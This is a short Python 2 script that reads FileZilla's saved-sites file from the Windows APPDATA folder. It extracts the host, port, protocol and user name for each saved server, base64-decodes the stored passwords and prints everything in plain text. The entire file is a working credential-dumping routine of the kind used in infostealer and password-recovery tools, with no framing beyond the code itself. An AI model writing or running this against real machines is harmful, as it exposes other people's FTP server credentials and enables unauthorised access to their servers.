#coding:utf-8

import os
from base64 import b64decode

def get_fz_pass():
    pw_file = os.path.join(os.environ['APPDATA'], r'FileZilla\sitemanager.xml')
    output = ''
    try:
        pw_file = open(pw_file)
        for line in pw_file.readlines():
            for keyword in ['Host', 'Port', 'Protocol', 'Type', 'User']:
                if ('<'+ keyword +'>') in line:
                    output = output + keyword + ':' +line.split("<" + keyword + ">")[1].split("</" + keyword + ">")[0] + '\n'
            if '<Pass encoding=\"base64\">' in line:
                password = b64decode(line.split("<Pass encoding=\"base64\">")[1].split("</Pass>")[0])
                output = output + 'Password:' + password + '\n'
        pw_file.close()
        return output
    except:
        return output

print get_fz_pass()